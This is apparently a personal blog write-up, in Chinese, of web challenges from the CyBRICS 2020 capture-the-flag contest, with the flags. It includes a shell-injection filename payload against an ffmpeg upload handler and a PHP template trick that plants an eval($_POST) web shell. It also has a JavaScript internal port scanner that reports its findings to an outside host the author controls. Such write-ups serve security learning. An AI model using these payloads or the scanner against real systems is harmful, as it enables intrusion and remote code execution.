date: 2020-07-29
categories:
- 比赛
tags:
- web
- ctf
- wp
title: CyBRICS2020
---
#  CyBRICS  2020



## Hunt

用burp修改返回包

flag:`cybrics{Th0se_c4p7ch4s_c4n_hunter2_my_hunter2ing_hunter2}`



## Gif2png

源代码已上传

```
if not bool(re.match("^[a-zA-Z0-9_\-. '\"\=\$\(\)\|]*$", file.filename)):
    exit()
...
def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
allowed_file(file.filename)
...
command = subprocess.Popen(f"ffmpeg -i 'uploads/{file.filename}' \"uploads/{uid}/%03d.png\"", shell=True)
```

`filename="'$(sleep 5)'a.gif"`来执行命令

cybrics{imagesaresocoolicandrawonthem}



## woc

![image631](https://raw.githubusercontent.com/Explorersss/photo/master/20200726002857.png)

calc.php


```php=
if (!preg_match('#(?=^([ %()*+\-./]+|\d+|M_PI|M_E|log|rand|sqrt|a?(sin|cos|tan)h?)+$)^([^()]*|([^()]*\((?>[^()]+|(?4))*\)[^()]*)*)$#s', $field)) {
        $value = "BAD";
    }else{
    $value = eval("return $field;");
}
```


```
9999999999999999999:1.0E+25
1/0:INF
0/0:NAN
log(0):-INF
```


newtemplate.php

```php=
        if (strpos($html, '<?') !== false) {
            $error = "Bad chars";
            break;
        }
        ...
        file_put_contents("calcs/$userid/templates/$uuid.html", $html);
```

calc.php
```php=
file_put_contents("calcs/$userid/$calc.php", "<script>var preloadValue = <?=json_encode((string)($field))?>;</script>\n" . file_get_contents("inc/calclib.html") . file_get_contents("calcs/$userid/templates/$template.html"));
```

html转php处，利用`/*`破坏结构，`file_get_contents("calcs/$userid/templates/$template.html"))`处`*/`收尾，于是绕过成功


新建template:
```
*/)).eval($_POST[1])?>
$requiredBlocks = [
            'id="back"',
            'id="field" name="field"',
            'id="digit0"',
            'id="digit1"',
            'id="digit2"',
            'id="digit3"',
            'id="digit4"',
            'id="digit5"',
            'id="digit6"',
            'id="digit7"',
            'id="digit8"',
            'id="digit9"',
            'id="plus"',
            'id="equals"',
        ];
```

向calc post:
`field=1/*&share=1`



flag:cybrics{5aMe_7h1ng_W3_d0_3Ve5y_n16ht_P1nKY.Try_2_t4k3_0vEr_t3h_w0RLd}

##  Developer's Laptop 

看题目样子是xss题?SSRF?


浏览器信息：HeadlessChrome/79.0.3945.79 

填写脚本：
```javascript=
a=document.getElementsByClassName("form-control");a[1].value="WQLSaidXUtQAfD6ptJc7Yg";a[0].value="http://ccreater.top:60000";
```

返回包
```
HEAD / HTTP/1.1
Host: ccreater.top:60000
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.79 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Access-Control-Request-Method: POST
Origin: prod.free-design-feedback-cybrics2020.ctf.su
Referer: http://prod.free-design-feedback-cybrics2020.ctf.su

```


等等开发人员的电脑？肯定一堆服务，内网扫描！

http服务扫描：
```htmlmixed=
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
</head>
<body>
    
<script>
var from = 1;
var complete = true;
var clear = false;
function check(text){
    var linkEl = document.head.querySelector('link[href*="'+text+'"');
    var cssLoaded = Boolean(linkEl.sheet);
    linkEl.addEventListener('load', function () {
        console.log(text)
        // log
		fetch("http://ccreater.top:60010/log.php?log="+text)
			.then(r=>r.text())
			.then(d=>{console.log("log success")})
		// log end
    });
}
function clearstyle(clear_from ,clear_to){
	clear = true;
	console.log("clear task start");
	while(clear_to<=clear_from){
            document.head.querySelector('link[href$=":'+clear_to+'"').remove();
			clear_to++;
    }
	clear = false;
	console.log("clear task end");
}
function make(text){
    head = document.getElementsByTagName('head')[0];
	var port = text;
    var url = "http://127.0.0.1:"+port,
    link = document.createElement('link');
    link.rel = "stylesheet";
    link.href = url;
    head.appendChild(link);
    check(text);
}
async function scan(){
	var to = from + 80 > 65535 ? 65535 : from + 80;
	for(var i=from;i<to;i++){
		make(String(i));
	}
	from +=80;
	setTimeout(()=>{clearstyle(from,to);},5000);
};

async function listener (){
	console.log("listener works,from:"+from+",complete:"+complete);
	if(from < 65535){
		setTimeout(listener,5000);
		if(complete && !clear){
			console.log("new task!");
			scan()
				.then(()=>{complete = true;})
			complete = false;
		}
	}
	
}
listener()
</script>
</body>
</html>

```



虽然我猜到了有内网服务但是到最后我还是没有扫到。。

脚本在本地是可以跑的，但是服务器上就不行，可能是因为有时间限制吧，遗憾。